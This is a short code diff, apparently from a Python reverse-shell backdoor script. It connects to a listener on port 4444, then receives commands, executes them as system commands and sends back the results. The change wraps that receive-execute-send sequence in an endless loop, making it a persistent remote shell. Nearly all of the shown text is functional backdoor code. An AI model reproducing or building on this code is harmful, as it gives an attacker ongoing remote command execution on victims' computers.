@@ -13,8 +13,10 @@ connection.connect(("localhost", 4444))
 
 connection.send("\n [+] Connection established. \n")
 
-command = connection.recv(1024)
-command_result = execute_system_command(command)
-connection.send(command_result)
+while True:
+    command = connection.recv(1024)
+    command_result = execute_system_command(command)
+    connection.send(command_result)
+
 
 connection.close()
